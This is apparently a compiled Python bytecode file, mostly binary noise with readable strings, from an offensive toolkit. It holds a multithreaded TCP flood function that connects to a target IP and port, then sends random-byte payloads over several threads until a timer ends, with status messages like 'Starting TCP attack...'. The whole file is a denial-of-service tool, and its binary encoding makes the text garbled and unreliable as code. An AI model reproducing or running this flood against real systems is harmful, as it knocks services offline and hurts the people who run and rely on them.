a
    g�`y  �                   @   s0   d dl Z d dlZd dlZd dlmZ dd� ZdS )�    N)�Threadc                    s�   da |�d�d � t|�d�d ��td� g }� �fdd�}t| �D ]4}tdt|� d	 � t|d
�}|��  |�|� qFt	�
|� |D ]}da |��  q�td� d S )NF�:r   �   z%[1;34m[*][0m Starting TCP attack...c               
      s�   t rq�z"t�tjtj�} | �� �f� W n: tyb } z"t|� td� t�  W Y d }~n
d }~0 0 z.td�D ] }t	�
t	�dd��}| �|� qnW nB ty� } z*t|� t�d� W Y d }~q W Y d }~q d }~0 0 tdtt|�� d � q d S )Nz/[1;31m[-][0m Failed to create TCP connection!�   r   �x   g      �?z$[1;32m[+][0m TCP packet with size z
 was sent!)�FINISH�socketZAF_INETZSOCK_STREAMZconnect�	Exception�print�exit�range�random�_urandom�randint�send�time�sleep�str�len)Zsock�e�_Zpayload�Z	target_ipZtarget_port� �2/storage/emulated/0/Script Vip/toolso/other/tcp.py�	tcp_flood   s$    
"zTCP_ATTACK.<locals>.tcp_floodz[1;34m[*][0m Staring thread z...)�targetTz [1;77m[i][0m Attack completed.)r   �split�intr
   r   r   r   �start�appendr   r   �join)ZthreadsZattack_timer   Zthreads_listr   �thread�tr   r   r   �
TCP_ATTACK   s     


r#   )r   r   r   Z	threadingr   r#   r   r   r   r   �<module>   s   